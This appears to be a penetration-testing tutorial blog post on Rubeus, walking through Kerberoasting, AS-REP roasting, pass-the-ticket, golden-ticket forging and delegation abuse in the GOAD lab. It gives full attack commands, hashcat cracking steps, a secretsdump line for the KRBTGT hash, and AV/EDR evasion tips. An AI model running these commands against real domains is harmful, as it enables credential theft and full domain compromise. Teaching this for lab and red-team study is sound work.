---
layout: post
title: "10 Days of AD Security: Day 3 - Rubeus"
date: 2026-02-07
category: Active Directory Security
author: James Wells
---

## History and Overview

Rubeus is a C# toolkit for Kerberos interaction and abuse, created by Will Schroeder (@harmj0y) and Benjamin Delpy as part of the GhostPack collection of offensive security tools. Released in 2018, Rubeus consolidated various Kerberos attack techniques into a single, powerful binary that runs natively on Windows without requiring PowerShell. The tool is named after Rubeus Hagrid from Harry Potter, fitting the magical theme of GhostPack tools. Rubeus implements the full spectrum of Kerberos attacks: Kerberoasting for cracking service account passwords, AS-REP Roasting for accounts without Kerberos pre-authentication, ticket manipulation for Pass-the-Ticket attacks, and even advanced techniques like Golden and Diamond Ticket creation. Unlike Python-based alternatives, Rubeus leverages Windows APIs directly, making it extremely fast and capable of operations that are difficult or impossible from Linux. The tool received major updates in November 2025, adding support for the latest Kerberos encryption types and improved evasion techniques.

## Download and Installation

**Official Source:** [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

**Installation:**

```powershell
# Download pre-compiled binary from releases
# https://github.com/GhostPack/Rubeus/releases

# Or compile from source
git clone https://github.com/GhostPack/Rubeus.git
# Open Rubeus.sln in Visual Studio and build

# Transfer to target Windows system
# Execute from command line
.\Rubeus.exe
```

**OPSEC Considerations:**
- Rubeus is heavily signatured by AV/EDR
- Consider obfuscation or in-memory execution via Cobalt Strike, Covenant, or Donut
- Use named pipes or process injection for stealth
- Some commands trigger Windows Event IDs that SOC teams monitor

## When to Use Rubeus

Use Rubeus when you need to:
- **Kerberoast service accounts**: Extract TGS tickets for offline password cracking
- **AS-REP Roast accounts**: Attack users without Kerberos pre-authentication enabled
- **Perform Pass-the-Ticket**: Use stolen Kerberos tickets for authentication
- **Create Golden Tickets**: Forge TGTs with compromised KRBTGT hash
- **Create Silver Tickets**: Forge service tickets for specific resources
- **Manipulate Kerberos delegation**: Abuse constrained and unconstrained delegation
- **Request tickets for specific services**: Target specific SPNs for access
- **Monitor for new Kerberos tickets**: Harvest credentials in real-time

Rubeus is primarily used during credential access and privilege escalation phases, particularly in Windows-heavy environments where Kerberos is the primary authentication protocol.

## Walkthrough

**Attack 1: Kerberoasting**

Extract and crack service account passwords:

```powershell
# Request TGS tickets for all SPNs
.\Rubeus.exe kerberoast /simple /nowrap

# Target specific user
.\Rubeus.exe kerberoast /user:sqlservice /simple /nowrap

# Export to file for hashcat
.\Rubeus.exe kerberoast /simple /nowrap /outfile:tickets.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 tickets.txt rockyou.txt
```

**Attack 2: AS-REP Roasting**

Target accounts without Kerberos pre-authentication:

```powershell
# Roast a specific user
.\Rubeus.exe asreproast /user:brandon.stark /format:hashcat /nowrap

# Roast all vulnerable users in domain
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt
```

**Attack 3: Pass-the-Ticket**

Use stolen Kerberos tickets:

```powershell
# Dump current tickets
.\Rubeus.exe dump

# Convert ticket to base64 for transfer
.\Rubeus.exe dump /luid:0x123456 /nowrap

# Import ticket into current session
.\Rubeus.exe ptt /ticket:[base64ticket]

# Verify ticket import
klist
```

**Attack 4: Golden Ticket Creation**

Forge TGT with KRBTGT hash (requires DA compromise first):

```powershell
# Create Golden Ticket
.\Rubeus.exe golden /rc4:[krbtgt_hash] /user:administrator /domain:example.local /sid:S-1-5-21-... /nowrap

# Import the ticket
.\Rubeus.exe ptt /ticket:[base64ticket]

# Now have unlimited domain access
```

**Attack 5: S4U Abuse (Constrained Delegation)**

Abuse Kerberos delegation to impersonate users:

```powershell
# Request TGT for account with delegation rights
.\Rubeus.exe asktgt /user:sqlservice /rc4:[hash] /nowrap

# Perform S4U2Self and S4U2Proxy
.\Rubeus.exe s4u /ticket:[TGT] /impersonateuser:administrator /msdsspn:cifs/server.example.local /ptt
```

## Game of Active Directory Lab Example

In the GOAD environment, Rubeus is essential for Kerberos-based attacks:

**Scenario: Comprehensive Kerberos Attack Chain**

1. **AS-REP Roasting brandon.stark**:
   ```powershell
   # From Windows attack box in GOAD
   .\Rubeus.exe asreproast /user:brandon.stark /format:hashcat /nowrap

   # Output: Hash ready for cracking
   # $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:...
   ```

2. **Kerberoasting jon.snow**:
   ```powershell
   # Enumerate and roast SPNs
   .\Rubeus.exe kerberoast /user:jon.snow /simple /nowrap

   # GOAD has jon.snow configured with SPN MSSQLsvc/...
   # Crack the resulting hash to get jon.snow password
   ```

3. **Golden Ticket After DA Compromise**:
   ```bash
   # First get KRBTGT hash (from Linux or Windows)
   # Using impacket:
   impacket-secretsdump north.sevenkingdoms.local/administrator@192.168.56.11 -just-dc-user krbtgt

   # Back on Windows with Rubeus:
   ```
   ```powershell
   .\Rubeus.exe golden /rc4:[krbtgt_ntlm_hash] /user:fakeadmin /domain:north.sevenkingdoms.local /sid:S-1-5-21-[domain-sid] /nowrap

   # Import and become DA
   .\Rubeus.exe ptt /ticket:[golden_ticket]
   ```

4. **Monitoring for Credentials**:
   ```powershell
   # Harvest new Kerberos tickets as users log in
   .\Rubeus.exe harvest /interval:30
   ```

5. **Cross-Domain Attack**:
   ```powershell
   # Use tickets to move between GOAD domains
   # Request TGT for North domain
   .\Rubeus.exe asktgt /user:user /password:pass /domain:north.sevenkingdoms.local

   # Use trust relationship to access Essos
   .\Rubeus.exe asktgs /ticket:[north_tgt] /service:krbtgt/essos.local /dc:essos-dc /ptt
   ```

**GOAD-Specific Rubeus Applications:**
- Exploit the intentionally weak SPNs on service accounts
- Target the AS-REP roastable accounts (brandon.stark)
- Demonstrate delegation abuse on SQL servers
- Create tickets for GOAD's multi-domain trust relationships
- Harvest credentials from interactive logons to GOAD servers

## Conclusion

Rubeus represents the state of the art in Windows-native Kerberos exploitation. Its comprehensive feature set, speed, and direct API access make it superior to Python alternatives for Windows-based operations. The tool's ability to perform complex Kerberos attacks entirely from memory, without touching disk, makes it a favorite among red teams and adversaries alike.

In the GOAD lab, Rubeus is critical for exploiting the Kerberos misconfigurations that are core to the lab's attack paths. From AS-REP Roasting to Golden Tickets, Rubeus provides the complete Kerberos attack toolkit. Understanding Rubeus is essential for modern AD penetration testing.

**Next in this series:** Day 4 will cover Mimikatz, the legendary credential extraction tool that changed Windows security forever.
